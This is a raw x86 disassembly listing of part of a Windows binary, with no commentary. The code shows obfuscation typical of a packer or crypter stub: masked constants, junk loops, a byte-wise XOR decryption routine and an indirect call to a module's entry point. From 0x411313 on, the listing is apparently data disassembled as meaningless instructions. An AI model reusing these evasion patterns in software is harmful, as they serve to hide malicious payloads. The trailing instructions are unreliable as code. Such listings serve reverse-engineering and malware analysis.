  410959:	mov    ds:0x41d5e8,eax
  41095e:	mov    eax,ds:0x41d3ec
  410963:	mov    eax,DWORD PTR [eax+0x18c]
  410969:	mov    eax,DWORD PTR [eax]
  41096b:	mov    DWORD PTR [ebp-0x30],eax
  41096e:	mov    eax,0xf89c85ba
  410973:	mov    DWORD PTR [ebp-0x1c],eax
  410976:	mov    DWORD PTR [ebp-0x1c],eax
  410979:	mov    DWORD PTR [ebp-0x1c],eax
  41097c:	mov    DWORD PTR [ebp-0x1c],ebx
  41097f:	mov    DWORD PTR [ebp-0x38],eax
  410982:	mov    DWORD PTR [ebp-0x38],0xf89c85be
  410989:	mov    ebx,DWORD PTR [ebp-0x4]
  41098c:	mov    ecx,DWORD PTR [ebp-0x8]
  41098f:	mov    edx,DWORD PTR [ebp-0x8]
  410992:	xor    edx,esi
  410994:	xor    ecx,esi
  410996:	add    ecx,edx
  410998:	mov    edx,DWORD PTR [ebp-0x8]
  41099b:	xor    ebx,esi
  41099d:	xor    edx,esi
  41099f:	add    ebx,edi
  4109a1:	lea    ecx,[ecx+edx*1+0x975891]
  4109a8:	cmp    ebx,ecx
  4109aa:	ja     0x410a0b
  4109b0:	mov    eax,DWORD PTR [ebp-0x8]
  4109b3:	xor    eax,esi
  4109b5:	lea    eax,[eax+ebx*1+0x3272db]
  4109bc:	push   eax
  4109bd:	mov    eax,DWORD PTR [ebp-0x1c]
  4109c0:	xor    eax,esi
  4109c2:	lea    eax,[ebp+eax*1+0x3272e3]
  4109c9:	push   eax
  4109ca:	mov    eax,ds:0x41d3ec
  4109cf:	push   DWORD PTR [eax+0x1bc]
  4109d5:	call   0x403ce8
  4109da:	mov    eax,DWORD PTR [ebp-0x8]
  4109dd:	xor    eax,esi
  4109df:	lea    ebx,[ebx+eax*1+0x3272db]
  4109e6:	mov    eax,DWORD PTR [ebp-0x8]
  4109e9:	mov    ecx,DWORD PTR [ebp-0x8]
  4109ec:	xor    ecx,esi
  4109ee:	xor    eax,esi
  4109f0:	add    eax,ecx
  4109f2:	mov    ecx,DWORD PTR [ebp-0x8]
  4109f5:	xor    ecx,esi
  4109f7:	lea    eax,[eax+ecx*1+0x975891]
  4109fe:	cmp    ebx,eax
  410a00:	jbe    0x4109b0
  410a06:	mov    eax,0xf89c85ba
  410a0b:	mov    ecx,DWORD PTR [ebp+0xc]
  410a0e:	mov    DWORD PTR ds:0x41d270,ecx
  410a14:	mov    ecx,DWORD PTR [ebp+0x10]
  410a17:	mov    DWORD PTR ds:0x41d4c4,ecx
  410a1d:	mov    ecx,DWORD PTR ds:0x41d270
  410a23:	mov    edx,DWORD PTR [ebp-0x20]
  410a26:	sub    ecx,edi
  410a28:	xor    ecx,esi
  410a2a:	mov    DWORD PTR [edx],ecx
  410a2c:	mov    edx,DWORD PTR [ebp-0xc]
  410a2f:	mov    ecx,0xf89c85b6
  410a34:	cmp    edx,ecx
  410a36:	jne    0x410a61
  410a3c:	lea    eax,[ebp-0x14]
  410a3f:	mov    DWORD PTR [ebp-0x24],eax
  410a42:	lea    eax,[ebp+0x4]
  410a45:	mov    DWORD PTR [ebp-0x14],eax
  410a48:	mov    eax,DWORD PTR [ebp-0x14]
  410a4b:	test   eax,eax
  410a4d:	je     0x410b76
  410a53:	mov    eax,DWORD PTR [ebp-0x10]
  410a56:	mov    eax,DWORD PTR [ebp-0x8]
  410a59:	lea    eax,[ebp-0x24]
  410a5c:	jmp    0x410b6d
  410a61:	mov    edx,DWORD PTR [ebp-0x28]
  410a64:	cmp    edx,0xf89c85b5
  410a6a:	je     0x410ac7
  410a70:	mov    edx,DWORD PTR [ebp-0x4]
  410a73:	mov    ebx,DWORD PTR [ebp-0x2c]
  410a76:	xor    edx,esi
  410a78:	add    edx,edi
  410a7a:	cmp    edx,ebx
  410a7c:	je     0x410ac7
  410a82:	mov    eax,ds:0x41d3ec
  410a87:	mov    eax,DWORD PTR [eax+0x194]
  410a8d:	mov    ecx,DWORD PTR [eax]
  410a8f:	mov    eax,DWORD PTR [ecx+0x3c]
  410a92:	push   DWORD PTR ds:0x41d4c4
  410a98:	mov    eax,DWORD PTR [eax+ecx*1+0x28]
  410a9c:	push   DWORD PTR ds:0x41d270
  410aa2:	add    eax,ecx
  410aa4:	mov    ecx,DWORD PTR ds:0x41d3ec
  410aaa:	mov    ecx,DWORD PTR [ecx+0x194]
  410ab0:	push   DWORD PTR [ecx]
  410ab2:	call   eax
  410ab4:	mov    ecx,DWORD PTR ds:0x41d3ec
  410aba:	mov    ecx,DWORD PTR [ecx+0x1cc]
  410ac0:	mov    DWORD PTR [ecx],eax
  410ac2:	jmp    0x410b76
  410ac7:	mov    edx,DWORD PTR [ebp-0x4]
  410aca:	mov    ebx,DWORD PTR [ebp-0x30]
  410acd:	xor    edx,esi
  410acf:	add    edx,edi
  410ad1:	cmp    edx,ebx
  410ad3:	jne    0x410b2c
  410ad9:	mov    edx,DWORD PTR [ebp-0x4]
  410adc:	mov    ebx,DWORD PTR ds:0x41d3ec
  410ae2:	mov    ebx,DWORD PTR [ebx+0x198]
  410ae8:	xor    edx,esi
  410aea:	add    edx,edi
  410aec:	cmp    edx,DWORD PTR [ebx]
  410aee:	jne    0x410b09
  410af4:	push   ecx
  410af5:	mov    ecx,DWORD PTR [ebp-0x4]
  410af8:	xor    ecx,esi
  410afa:	add    ecx,edi
  410afc:	push   ecx
  410afd:	push   eax
  410afe:	push   DWORD PTR [ebp-0x8]
  410b01:	push   DWORD PTR [ebp-0x4]
  410b04:	call   0x40b7a6
  410b09:	push   DWORD PTR [ebp-0x8]
  410b0c:	push   DWORD PTR [ebp-0x4]
  410b0f:	call   0x410b98
  410b14:	mov    eax,DWORD PTR [ebp-0x4]
  410b17:	xor    eax,esi
  410b19:	add    eax,edi
  410b1b:	mov    ds:0x41d470,eax
  410b20:	mov    eax,DWORD PTR [ebp-0x4]
  410b23:	xor    eax,esi
  410b25:	add    eax,edi
  410b27:	mov    ds:0x41d468,eax
  410b2c:	lea    eax,[ebp-0x18]
  410b2f:	mov    DWORD PTR [ebp-0x34],eax
  410b32:	lea    eax,[ebp+0x4]
  410b35:	mov    DWORD PTR [ebp-0x18],eax
  410b38:	mov    eax,DWORD PTR [ebp-0x18]
  410b3b:	test   eax,eax
  410b3d:	je     0x410b76
  410b43:	mov    DWORD PTR [ebp-0x3c],0xf152c3d
  410b4a:	mov    DWORD PTR [ebp-0x40],0x712ed08
  410b51:	mov    DWORD PTR [ebp-0x44],0x373fc2e
  410b58:	mov    DWORD PTR [ebp-0x48],0x72670a1e
  410b5f:	call   0x40b3b6
  410b64:	mov    eax,DWORD PTR [ebp-0x10]
  410b67:	mov    eax,DWORD PTR [ebp-0x8]
  410b6a:	lea    eax,[ebp-0x34]
  410b6d:	push   eax
  410b6e:	push   DWORD PTR [ebp-0x4]
  410b71:	call   0x40b1b5
  410b76:	mov    eax,ds:0x41d3ec
  410b7b:	push   0x4
  410b7d:	add    eax,0x1cc
  410b82:	push   eax
  410b83:	lea    eax,[ebp-0x10]
  410b86:	push   eax
  410b87:	call   0x403ce8
  410b8c:	mov    eax,DWORD PTR [ebp-0x10]
  410b8f:	mov    eax,DWORD PTR [eax]
  410b91:	pop    edi
  410b92:	pop    esi
  410b93:	pop    ebx
  410b94:	leave  
  410b95:	ret    0xc
  410b98:	push   ebp
  410b99:	mov    ebp,esp
  410b9b:	sub    esp,0x98
  410ba1:	mov    eax,DWORD PTR [ebp+0x8]
  410ba4:	mov    ecx,DWORD PTR ds:0x42601c
  410baa:	or     DWORD PTR ds:0x425008,ecx
  410bb0:	push   ebx
  410bb1:	push   esi
  410bb2:	and    ecx,esi
  410bb4:	push   edi
  410bb5:	inc    ecx
  410bb6:	mov    esi,0x7510893
  410bbb:	xor    eax,esi
  410bbd:	mov    edi,0x3272db
  410bc2:	add    eax,edi
  410bc4:	and    DWORD PTR ds:0x42800c,0x0
  410bce:	jmp    0x410be0
  410bd3:	mov    ecx,DWORD PTR ds:0x42800c
  410bd9:	inc    ecx
  410bda:	mov    DWORD PTR ds:0x42800c,ecx
  410be0:	cmp    DWORD PTR ds:0x42800c,0x18
  410be7:	jae    0x410c21
  410bed:	cmp    DWORD PTR ds:0x42800c,0x1f
  410bf4:	jne    0x410c1c
  410bfa:	push   0x41ff9d
  410bff:	push   0x7ac7
  410c04:	push   0x1b99
  410c09:	push   0x1d9a
  410c0e:	push   DWORD PTR [ebp-0x10]
  410c11:	push   0x26f8
  410c16:	call   DWORD PTR ds:0x42104c
  410c1c:	jmp    0x410bd3
  410c21:	mov    DWORD PTR [ebp-0x30],eax
  410c24:	sub    eax,eax
  410c26:	mov    eax,ds:0x41d26c
  410c2b:	sbb    DWORD PTR ds:0x42801c,edi
  410c31:	mov    eax,DWORD PTR [eax]
  410c33:	mov    DWORD PTR [ebp-0x20],eax
  410c36:	and    DWORD PTR ds:0x426004,0x0
  410c40:	mov    ecx,DWORD PTR ds:0x426004
  410c46:	inc    ecx
  410c47:	mov    DWORD PTR ds:0x426004,ecx
  410c4d:	cmp    DWORD PTR ds:0x426004,0x21
  410c54:	jne    0x410c65
  410c5a:	push   0x2993
  410c5f:	call   DWORD PTR ds:0x421014
  410c65:	cmp    DWORD PTR ds:0x426004,0x1d
  410c6c:	jb     0x410c40
  410c72:	mov    DWORD PTR ds:0x425024,0x1a
  410c7c:	cmp    DWORD PTR ds:0x425024,0x0
  410c83:	je     0x410ccd
  410c89:	cmp    DWORD PTR ds:0x425024,0x8
  410c90:	jne    0x410ca1
  410c96:	push   0x8b04
  410c9b:	call   DWORD PTR ds:0x421018
  410ca1:	cmp    DWORD PTR ds:0x425024,0x9
  410ca8:	jne    0x410cbb
  410cae:	mov    ecx,DWORD PTR ds:0x425024
  410cb4:	dec    ecx
  410cb5:	mov    DWORD PTR ds:0x425024,ecx
  410cbb:	mov    ecx,DWORD PTR ds:0x425024
  410cc1:	dec    ecx
  410cc2:	mov    DWORD PTR ds:0x425024,ecx
  410cc8:	jmp    0x410c7c
  410ccd:	mov    eax,ds:0x41d474
  410cd2:	inc    ecx
  410cd3:	mov    eax,DWORD PTR [eax]
  410cd5:	mov    DWORD PTR [ebp-0x28],eax
  410cd8:	mov    DWORD PTR [ebp-0x38],0xf89c87b6
  410cdf:	sbb    DWORD PTR ds:0x42601c,0xf37
  410ce9:	mov    eax,DWORD PTR [ebp-0x38]
  410cec:	and    DWORD PTR ds:0x42900c,0x0
  410cf6:	mov    ecx,DWORD PTR ds:0x42900c
  410cfc:	inc    ecx
  410cfd:	mov    DWORD PTR ds:0x42900c,ecx
  410d03:	cmp    DWORD PTR ds:0x42900c,0x6
  410d0a:	jne    0x410d24
  410d10:	push   0x133c
  410d15:	push   DWORD PTR [ebp-0x14]
  410d18:	push   DWORD PTR [ebp-0x24]
  410d1b:	push   DWORD PTR [ebp-0x18]
  410d1e:	call   DWORD PTR ds:0x42101c
  410d24:	cmp    DWORD PTR ds:0x42900c,0x5
  410d2b:	jne    0x410d40
  410d31:	xor    ecx,ecx
  410d33:	xor    ecx,DWORD PTR ds:0x42900c
  410d39:	inc    ecx
  410d3a:	mov    DWORD PTR ds:0x42900c,ecx
  410d40:	cmp    DWORD PTR ds:0x42900c,0x1b
  410d47:	jb     0x410cf6
  410d4d:	xor    eax,esi
  410d4f:	and    DWORD PTR ds:0x429010,0x2e08
  410d59:	add    eax,edi
  410d5b:	mov    DWORD PTR [ebp-0x30],eax
  410d5e:	sbb    eax,eax
  410d60:	mov    eax,ds:0x41d3ec
  410d65:	sbb    DWORD PTR ds:0x428018,0x460c
  410d6f:	mov    DWORD PTR [ebp-0x30],eax
  410d72:	add    eax,0xded
  410d77:	mov    eax,DWORD PTR [ebp-0x20]
  410d7a:	mov    DWORD PTR [ebp-0x14],eax
  410d7d:	sbb    DWORD PTR ds:0x42501c,0x3470
  410d87:	mov    eax,DWORD PTR [ebp-0x14]
  410d8a:	and    DWORD PTR ds:0x428018,0x0
  410d94:	jmp    0x410da6
  410d99:	mov    ecx,DWORD PTR ds:0x428018
  410d9f:	inc    ecx
  410da0:	mov    DWORD PTR ds:0x428018,ecx
  410da6:	cmp    DWORD PTR ds:0x428018,0x15
  410dad:	jae    0x410df5
  410db3:	cmp    DWORD PTR ds:0x428018,0x6
  410dba:	jne    0x410dd0
  410dc0:	push   0x41ffff
  410dc5:	push   0x41ffe1
  410dca:	call   DWORD PTR ds:0x421050
  410dd0:	cmp    DWORD PTR ds:0x428018,0x5
  410dd7:	jne    0x410dea
  410ddd:	mov    ecx,DWORD PTR ds:0x428018
  410de3:	inc    ecx
  410de4:	mov    DWORD PTR ds:0x428018,ecx
  410dea:	jmp    0x410d99
  410def:	and    DWORD PTR ds:0x426000,ecx
  410df5:	push   0x4
  410df7:	pop    ecx
  410df8:	sub    ecx,eax
  410dfa:	add    ecx,DWORD PTR [ebp-0x28]
  410dfd:	mov    DWORD PTR [ebp-0x2c],0xf89c85f6
  410e04:	mov    DWORD PTR [ebp-0x24],ecx
  410e07:	mov    DWORD PTR [ebp-0x98],0xf89c85ba
  410e11:	or     DWORD PTR ds:0x427000,edx
  410e17:	mov    eax,DWORD PTR [ebp-0x14]
  410e1a:	xor    DWORD PTR ds:0x429010,0x390a
  410e24:	mov    DWORD PTR [ebp-0x94],eax
  410e2a:	sbb    DWORD PTR ds:0x425020,0x44b0
  410e34:	mov    eax,DWORD PTR [ebp-0x24]
  410e37:	mov    DWORD PTR [ebp-0x90],eax
  410e3d:	mov    DWORD PTR ds:0x429010,0x17
  410e47:	cmp    DWORD PTR ds:0x429010,0x0
  410e4e:	je     0x410ede
  410e54:	cmp    DWORD PTR ds:0x429010,0x5
  410e5b:	jne    0x410e6f
  410e61:	push   DWORD PTR [ebp-0x24]
  410e64:	push   0x823f
  410e69:	call   DWORD PTR ds:0x421054
  410e6f:	cmp    DWORD PTR ds:0x429010,0x6
  410e76:	jne    0x410e87
  410e7c:	mov    eax,ds:0x429010
  410e81:	dec    eax
  410e82:	mov    ds:0x429010,eax
  410e87:	mov    eax,ds:0x429010
  410e8c:	dec    eax
  410e8d:	mov    ds:0x429010,eax
  410e92:	jmp    0x410e47
  410e97:	and    DWORD PTR ds:0x429004,0x0
  410ea1:	jmp    0x410eb1
  410ea6:	mov    eax,ds:0x429004
  410eab:	inc    eax
  410eac:	mov    ds:0x429004,eax
  410eb1:	cmp    DWORD PTR ds:0x429004,0x18
  410eb8:	jae    0x410ede
  410ebe:	cmp    DWORD PTR ds:0x429004,0x26
  410ec5:	jne    0x410ed9
  410ecb:	push   0x42801c
  410ed0:	push   DWORD PTR [ebp-0x18]
  410ed3:	call   DWORD PTR ds:0x421058
  410ed9:	jmp    0x410ea6
  410ede:	mov    eax,DWORD PTR [ebp-0x2c]
  410ee1:	or     DWORD PTR ds:0x429014,0x2e7c
  410eeb:	xor    eax,esi
  410eed:	add    eax,edi
  410eef:	mov    DWORD PTR [ebp-0x8c],eax
  410ef5:	lea    eax,[ebp-0x50]
  410ef8:	mov    DWORD PTR [ebp-0x88],eax
  410efe:	xor    DWORD PTR ds:0x425000,0x42600c
  410f08:	mov    eax,DWORD PTR [ebp-0x98]
  410f0e:	xor    DWORD PTR ds:0x42900c,0x426014
  410f18:	xor    eax,esi
  410f1a:	add    eax,edi
  410f1c:	adc    DWORD PTR ds:0x426008,0x425014
  410f26:	mov    DWORD PTR [ebp-0x98],eax
  410f2c:	lea    eax,[ebp-0x98]
  410f32:	adc    DWORD PTR ds:0x427018,0x426018
  410f3c:	push   eax
  410f3d:	adc    DWORD PTR ds:0x426004,0x2a7
  410f47:	mov    eax,DWORD PTR [ebp+0xc]
  410f4a:	sub    DWORD PTR ds:0x429010,0x42501c
  410f54:	xor    eax,esi
  410f56:	add    DWORD PTR ds:0x425020,0x427018
  410f60:	add    eax,edi
  410f62:	xor    DWORD PTR ds:0x42501c,0x425000
  410f6c:	push   eax
  410f6d:	mov    DWORD PTR ds:0x429010,0x1047
  410f77:	mov    eax,ds:0x41d40c
  410f7c:	and    DWORD PTR ds:0x425018,0x428010
  410f86:	push   0x41d362
  410f8b:	push   DWORD PTR [eax]
  410f8d:	call   0x403f26
  410f92:	sub    eax,DWORD PTR ds:0x427000
  410f98:	mov    eax,DWORD PTR [ebp-0x14]
  410f9b:	adc    ecx,DWORD PTR ds:0x425008
  410fa1:	mov    ecx,DWORD PTR [ebp-0x24]
  410fa4:	xor    DWORD PTR ds:0x429010,0x42900c
  410fae:	mov    DWORD PTR [ebp-0x4c],ecx
  410fb1:	mov    ecx,DWORD PTR [ebp+0x8]
  410fb4:	adc    DWORD PTR ds:0x425010,0x425014
  410fbe:	xor    ecx,esi
  410fc0:	add    DWORD PTR ds:0x428018,0x42900c
  410fca:	mov    DWORD PTR [ebp-0x38],eax
  410fcd:	add    ecx,edi
  410fcf:	mov    DWORD PTR ds:0x427000,0x74a5
  410fd9:	jmp    0x41374e
  410fde:	and    DWORD PTR ds:0x426008,0x0
  410fe8:	mov    ebx,DWORD PTR ds:0x426008
  410fee:	inc    ebx
  410fef:	mov    DWORD PTR ds:0x426008,ebx
  410ff5:	cmp    DWORD PTR ds:0x426008,0x15
  410ffc:	jne    0x411017
  411002:	push   0x42900c
  411007:	push   0x429010
  41100c:	push   0x5fed
  411011:	call   DWORD PTR ds:0x42105c
  411017:	cmp    DWORD PTR ds:0x426008,0x12
  41101e:	jb     0x410fe8
  411024:	and    DWORD PTR ds:0x426004,0x0
  41102e:	xor    ebx,ebx
  411030:	add    ebx,DWORD PTR ds:0x426004
  411036:	inc    ebx
  411037:	mov    DWORD PTR ds:0x426004,ebx
  41103d:	cmp    DWORD PTR ds:0x426004,0x20
  411044:	jne    0x41105d
  41104a:	push   DWORD PTR [ebp-0x20]
  41104d:	push   0x6608
  411052:	push   0x1aeb
  411057:	call   DWORD PTR ds:0x421020
  41105d:	cmp    DWORD PTR ds:0x426004,0x10
  411064:	jb     0x41102e
  41106a:	adc    DWORD PTR ds:0x427018,ecx
  411070:	lea    edx,[ecx+eax*1]
  411073:	sbb    DWORD PTR ds:0x428018,0x5978
  41107d:	mov    DWORD PTR [ebp-0x28],edx
  411080:	mov    edx,DWORD PTR ds:0x41d208
  411086:	mov    ebx,DWORD PTR ds:0x41d20c
  41108c:	sub    ebx,edx
  41108e:	sub    edx,DWORD PTR [edx+ebx*1]
  411091:	mov    edx,DWORD PTR [ebp-0x4c]
  411094:	and    DWORD PTR ds:0x426018,0x0
  41109e:	jmp    0x4110b0
  4110a3:	mov    ebx,DWORD PTR ds:0x426018
  4110a9:	inc    ebx
  4110aa:	mov    DWORD PTR ds:0x426018,ebx
  4110b0:	cmp    DWORD PTR ds:0x426018,0x16
  4110b7:	jae    0x4110e2
  4110bd:	cmp    DWORD PTR ds:0x426018,0x18
  4110c4:	jne    0x4110dd
  4110ca:	push   0x4880
  4110cf:	push   DWORD PTR [ebp-0x1c]
  4110d2:	push   0x14f0
  4110d7:	call   DWORD PTR ds:0x421028
  4110dd:	jmp    0x4110a3
  4110e2:	sub    edx,ecx
  4110e4:	xor    ebx,DWORD PTR ds:0x429004
  4110ea:	mov    DWORD PTR [ebp-0x20],edx
  4110ed:	and    DWORD PTR ds:0x427004,0x0
  4110f7:	mov    ebx,DWORD PTR ds:0x427004
  4110fd:	inc    ebx
  4110fe:	mov    DWORD PTR ds:0x427004,ebx
  411104:	cmp    DWORD PTR ds:0x427004,0x7
  41110b:	jne    0x41111c
  411111:	push   0x41ff3e
  411116:	call   DWORD PTR ds:0x42102c
  41111c:	cmp    DWORD PTR ds:0x427004,0x6
  411123:	jne    0x411136
  411129:	mov    ebx,DWORD PTR ds:0x427004
  41112f:	inc    ebx
  411130:	mov    DWORD PTR ds:0x427004,ebx
  411136:	cmp    DWORD PTR ds:0x427004,0x16
  41113d:	jb     0x4110f7
  411143:	movzx  edx,WORD PTR ds:0x428014
  41114a:	sbb    DWORD PTR ds:0x425000,edx
  411150:	mov    edx,DWORD PTR [ebp-0x20]
  411153:	or     ebx,0x6caa
  411159:	mov    DWORD PTR [ebp-0x14],edx
  41115c:	mov    edx,DWORD PTR [ebp-0x28]
  41115f:	mov    DWORD PTR [ebp-0x34],0xf89c85b6
  411166:	mov    DWORD PTR [ebp-0x44],edx
  411169:	mov    DWORD PTR [ebp-0x18],0xf89c85b5
  411170:	mov    edx,DWORD PTR [ebp-0x34]
  411173:	xor    edx,esi
  411175:	add    edx,edi
  411177:	mov    DWORD PTR [ebp-0x10],edx
  41117a:	mov    edx,DWORD PTR [ebp-0x34]
  41117d:	xor    edx,esi
  41117f:	add    edx,edi
  411181:	mov    DWORD PTR [ebp-0x8],edx
  411184:	mov    DWORD PTR [ebp-0x28],0xf89c85d6
  41118b:	mov    DWORD PTR [ebp-0x2c],0xf89c85bf
  411192:	mov    edx,DWORD PTR [ebp-0x34]
  411195:	mov    ebx,DWORD PTR [ebp-0x14]
  411198:	xor    edx,esi
  41119a:	add    edx,edi
  41119c:	cmp    ebx,edx
  41119e:	je     0x413742
  4111a4:	mov    eax,DWORD PTR [ebp-0x18]
  4111a7:	xor    eax,esi
  4111a9:	mov    edx,0xffcd8d25
  4111ae:	sub    edx,eax
  4111b0:	add    edx,DWORD PTR [ebp-0x14]
  4111b3:	mov    eax,DWORD PTR [ebp-0x18]
  4111b6:	mov    ebx,DWORD PTR [ebp-0x10]
  4111b9:	xor    eax,esi
  4111bb:	add    eax,edi
  4111bd:	imul   eax,ebx
  4111c0:	cmp    eax,edx
  4111c2:	ja     0x41373f
  4111c8:	mov    edx,DWORD PTR [ebp-0x10]
  4111cb:	mov    eax,DWORD PTR [ebp-0x14]
  4111ce:	mov    ebx,DWORD PTR [ebp-0x28]
  4111d1:	sub    eax,edx
  4111d3:	xor    ebx,esi
  4111d5:	xor    edx,edx
  4111d7:	add    ebx,edi
  4111d9:	div    ebx
  4111db:	mov    DWORD PTR [ebp-0x8],eax
  4111de:	mov    eax,DWORD PTR [ebp-0x2c]
  4111e1:	mov    edx,DWORD PTR [ebp-0x8]
  4111e4:	xor    eax,esi
  4111e6:	add    eax,edi
  4111e8:	cmp    edx,eax
  4111ea:	jbe    0x4111fa
  4111f0:	mov    eax,DWORD PTR [ebp-0x2c]
  4111f3:	xor    eax,esi
  4111f5:	add    eax,edi
  4111f7:	mov    DWORD PTR [ebp-0x8],eax
  4111fa:	mov    eax,DWORD PTR [ebp-0x28]
  4111fd:	mov    edx,DWORD PTR [ebp-0x8]
  411200:	xor    eax,esi
  411202:	add    eax,edi
  411204:	imul   eax,edx
  411207:	mov    DWORD PTR [ebp-0x8],eax
  41120a:	mov    eax,DWORD PTR [ebp-0x34]
  41120d:	mov    edx,DWORD PTR [ebp-0x8]
  411210:	xor    eax,esi
  411212:	add    eax,edi
  411214:	cmp    edx,eax
  411216:	je     0x413728
  41121c:	mov    eax,DWORD PTR [ebp-0x8]
  41121f:	mov    DWORD PTR [ebp-0x24],eax
  411222:	mov    eax,DWORD PTR [ebp-0x10]
  411225:	add    eax,DWORD PTR [ebp-0x44]
  411228:	mov    DWORD PTR [ebp-0x20],0xf89c85b6
  41122f:	mov    DWORD PTR [ebp-0x8],eax
  411232:	mov    eax,0xf89c85b5
  411237:	mov    DWORD PTR [ebp-0x3c],eax
  41123a:	mov    DWORD PTR [ebp-0x40],0xf89c85b4
  411241:	mov    DWORD PTR [ebp-0x30],0xf89c85bb
  411248:	mov    DWORD PTR [ebp-0x1c],eax
  41124b:	mov    eax,DWORD PTR [ebp-0x20]
  41124e:	xor    eax,esi
  411250:	add    eax,edi
  411252:	jmp    0x4136e4
  411257:	mov    DWORD PTR [ebp-0x48],0xf89c85bd
  41125e:	mov    eax,DWORD PTR [ebp-0x1c]
  411261:	mov    edx,DWORD PTR [ebp-0xc]
  411264:	xor    eax,esi
  411266:	add    eax,edi
  411268:	imul   eax,edx
  41126b:	mov    edx,DWORD PTR [ebp-0x8]
  41126e:	mov    al,BYTE PTR [eax+edx*1]
  411271:	mov    BYTE PTR [ebp-0x1],al
  411274:	mov    eax,DWORD PTR [ebp-0x1c]
  411277:	mov    edx,DWORD PTR [ebp-0xc]
  41127a:	xor    eax,esi
  41127c:	add    eax,edi
  41127e:	imul   eax,edx
  411281:	mov    edx,DWORD PTR [ebp-0x40]
  411284:	xor    edx,esi
  411286:	add    eax,edx
  411288:	mov    edx,DWORD PTR [ebp-0x8]
  41128b:	movzx  eax,BYTE PTR [eax+edx*1+0x3272db]
  411293:	mov    edx,DWORD PTR [ebp-0x48]
  411296:	xor    edx,esi
  411298:	lea    eax,[edx+eax*1+0x3272db]
  41129f:	movzx  edx,BYTE PTR [ebp-0x1]
  4112a3:	xor    edx,eax
  4112a5:	mov    BYTE PTR [ebp-0x1],dl
  4112a8:	mov    al,BYTE PTR [ebp-0x1]
  4112ab:	mov    edx,DWORD PTR [ebp-0x1c]
  4112ae:	mov    ebx,DWORD PTR [ebp-0xc]
  4112b1:	xor    edx,esi
  4112b3:	add    edx,edi
  4112b5:	imul   edx,ebx
  4112b8:	mov    ebx,DWORD PTR [ebp-0x8]
  4112bb:	mov    BYTE PTR [edx+ebx*1],al
  4112be:	mov    eax,DWORD PTR [ebp-0x1c]
  4112c1:	mov    edx,DWORD PTR [ebp-0xc]
  4112c4:	xor    eax,esi
  4112c6:	add    eax,edi
  4112c8:	imul   eax,edx
  4112cb:	mov    edx,DWORD PTR [ebp-0x8]
  4112ce:	mov    al,BYTE PTR [eax+edx*1]
  4112d1:	mov    BYTE PTR [ebp-0x1],al
  4112d4:	mov    eax,DWORD PTR [ebp-0x1c]
  4112d7:	mov    edx,DWORD PTR [ebp-0xc]
  4112da:	xor    eax,esi
  4112dc:	add    eax,edi
  4112de:	imul   eax,edx
  4112e1:	mov    edx,DWORD PTR [ebp-0x3c]
  4112e4:	xor    edx,esi
  4112e6:	add    eax,edx
  4112e8:	mov    edx,DWORD PTR [ebp-0x8]
  4112eb:	movzx  eax,BYTE PTR [eax+edx*1+0x3272db]
  4112f3:	mov    edx,DWORD PTR [ebp-0x54]
  4112f6:	xor    edx,esi
  4112f8:	lea    eax,[edx+eax*1+0x3272db]
  4112ff:	movzx  edx,BYTE PTR [ebp-0x1]
  411303:	xor    edx,eax
  411305:	mov    BYTE PTR [ebp-0x1],dl
  411308:	mov    al,BYTE PTR [ebp-0x1]
  41130b:	mov    edx,DWORD PTR [ebp-0x1c]
  41130e:	jmp    0x4136c0
  411313:	cli    
  411314:	jl     0x411300
  411316:	popa   
  411317:	fs jecxz 0x411383
  41131a:	repz push eax
  41131c:	push   esp
  41131d:	and    eax,0x1469a4d3
  411322:	into   
  411323:	push   edi
  411324:	mov    fs,WORD PTR [edx+0x62]
  411327:	int    0x5f
  411329:	bound  esp,QWORD PTR [edx+0x73]
  41132c:	adc    DWORD PTR [ebx+0x51],esi
  41132f:	jb     0x41134f
  411331:	add    BYTE PTR [eax],cl
  411333:	in     al,dx
  411334:	xor    eax,DWORD PTR [edx+0x23980a75]
  41133a:	xor    al,0xcc
  41133c:	pop    esp
  41133d:	mov    edx,0x78307835
  411342:	dec    ebp
  411343:	add    bh,BYTE PTR [edx-0x1c]
  411346:	xlat   BYTE PTR ds:[ebx]
  411347:	fwait
  411348:	out    dx,eax
  411349:	push   0xd
  41134b:	and    BYTE PTR [esi+0x6b16d156],ch
  411351:	arpl   WORD PTR [eax],bp
  411353:	and    ebp,DWORD PTR ds:0x3afadead
  411359:	nop
  41135a:	mov    ds:0xbc8a7a63,al
  41135f:	jb     0x4113d2
  411361:	sbb    al,0x1b
  411363:	mov    eax,ds:0x72847780
  411368:	stos   BYTE PTR es:[edi],al
  411369:	fst    DWORD PTR [eax-0x71]
  41136c:	popf   
  41136d:	cmp    esp,DWORD PTR [ecx-0x7]
  411370:	push   ebx
  411371:	fld    TBYTE PTR [edx-0x73]
  411374:	addr16 mov bl,0x54
  411377:	dec    esi
  411378:	mov    ds:0xffabc1db,eax
  41137d:	mov    edx,0x41fcaf4a
  411382:	cmp    eax,0x4046e9c5
  411387:	sbb    eax,0xc2cee1e6
  41138c:	fcom   QWORD PTR [eax]
  41138e:	stos   DWORD PTR es:[edi],eax
  41138f:	retf   
  411390:	xor    DWORD PTR [esp+ebp*2],ebp
  411393:	icebp  
  411394:	inc    eax
  411395:	adc    dh,cl
  411397:	pusha  
  411398:	leave  
  411399:	in     al,dx
  41139a:	loop   0x4113c0
  41139c:	dec    edx
  41139d:	jg     0x411393
  41139f:	pop    ebx
  4113a0:	rcr    BYTE PTR [edi+0x1f0714cc],1
  4113a6:	ficom  DWORD PTR [edx+0x29]
  4113a9:	mov    ch,0x2f
  4113ab:	fsub   DWORD PTR [ebp-0x593d6390]
  4113b1:	xor    eax,0x45eec680
  4113b6:	addr16 pop edi
  4113b8:	mov    ds:0x82b433e3,al
  4113bd:	aas    
  4113be:	push   ebp
  4113bf:	jbe    0x4113b0
  4113c1:	push   esp
  4113c2:	jne    0x4113af
  4113c4:	push   0x19
  4113c6:	repnz mov ebp,DWORD PTR [edi-0x6ae4a7b2]
  4113cd:	je     0x4113f2
  4113cf:	add    DWORD PTR [esi+0x214057b6],ebp
  4113d5:	cmp    ebx,DWORD PTR [eax]
  4113d7:	test   esi,0x46e05b0e
  4113dd:	sbb    eax,0x9214d74c
  4113e2:	xchg   esi,eax
  4113e3:	mov    eax,ds:0x32f83d2f
  4113e8:	push   es
  4113e9:	mov    bl,0x8a
  4113eb:	pop    ds
  4113ec:	test   BYTE PTR [ecx+0x74],bl
  4113ef:	test   eax,0x8e8b4de
  4113f4:	xchg   edx,eax
  4113f5:	pop    ecx
  4113f6:	ins    DWORD PTR es:[edi],dx
  4113f7:	mov    ebp,0xed830e5
  4113fc:	or     eax,0x37afa68
  411401:	(bad)  
